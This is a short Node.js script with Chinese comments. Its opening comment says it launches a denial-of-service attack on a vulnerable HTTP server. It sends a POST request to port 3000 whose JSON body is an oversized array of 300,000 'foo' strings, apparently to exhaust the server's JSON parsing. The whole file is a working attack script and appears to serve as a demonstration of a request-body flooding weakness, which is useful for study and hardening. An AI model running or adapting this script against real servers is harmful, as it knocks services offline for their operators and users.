//对脆弱的http服务器展开拒绝服务攻击
let http = require('http');

let req = http.request({
    method: 'POST',
    port: 3000,
    headers: {
        //告诉服务器你要发送json数据
        'Content-Type' : 'application/json'
    }
})

//开始发送一个超大的数组对象
req.write('[');
let n = 300000;

//数组中包含300000个字符串“foo”
while (n--) {
    req.write('"foo",')
}

req.write('"bar"');

req.end();
